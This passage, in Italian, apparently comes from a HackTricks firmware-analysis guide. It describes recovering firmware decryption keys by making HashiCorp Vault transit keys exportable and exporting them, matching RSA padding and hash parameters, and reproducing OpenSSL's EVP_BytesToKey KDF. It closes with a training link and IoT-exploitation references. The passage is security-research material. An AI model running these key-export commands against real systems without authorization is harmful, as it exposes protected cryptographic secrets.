- Rendi le transit keys esportabili solo all'interno del clone isolato: `vault write transit/keys/<name>/config exportable=true`
- Esporta la unwrap key: `vault read transit/export/encryption-key/<name>`
- Prova la chiave RSA recuperata con l'esatta coppia padding/hash utilizzata dal KMS. Un tentativo di decrittografia PKCS#1 v1.5 fallito e un tentativo di decrittografia OAEP predefinito fallito **non** dimostrano che la chiave sia errata; molti flussi basati su Vault usano OAEP con SHA-256, mentre le librerie comuni usano SHA-1 per impostazione predefinita.
- Se il payload inizia con `Salted__`, riproduci esattamente la KDF OpenSSL del vendor (`EVP_BytesToKey`, spesso MD5 sugli appliance legacy) prima di tentare la decrittografia AES-CBC.

Questo trasforma il problema del "firmware encrypted" in un problema più generale: **recuperare le operational keys lato appliance, quindi riprodurre offline gli esatti parametri di unwrap + KDF**.

## Formazione e certificazioni

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

## References

- [1] [Cracking del firmware con Claude: competenze senior, autonomia junior](https://bishopfox.com/blog/cracking-firmware-with-claude-senior-level-skill-junior-level-autonomy)
- [2] [Metodologia di Security Testing del firmware](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [3] [Hacking pratico dell'IoT: la guida definitiva all'attacco dell'Internet of Things](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [4] [Sfruttare zero-day nell'hardware abbandonato – blog di Trail of Bits](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
- [5] [Come un dispositivo smart da 20 $ mi ha dato accesso a casa tua](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)
- [6] [Ora mi vedi: ora sei Pwned](https://labs.taszk.io/articles/post/nowyouseemi/)
- [7] [Synacktiv - Sfruttare il Tesla Wall Connector dal suo connettore della porta di ricarica - Parte 2: bypass dell'anti-downgrade](https://www.synacktiv.com/en/publications/exploiting-the-tesla-wall-connector-from-its-charge-port-connector-part-2-bypassing)
- [8] [Fallo lampeggiare: sfruttamento Over-the-Air del Philips Hue Bridge](https://www.synacktiv.com/en/publications/make-it-blink-over-the-air-exploitation-of-the-philips-hue-bridge.html)
{{#include ../../banners/hacktricks-training.md}}
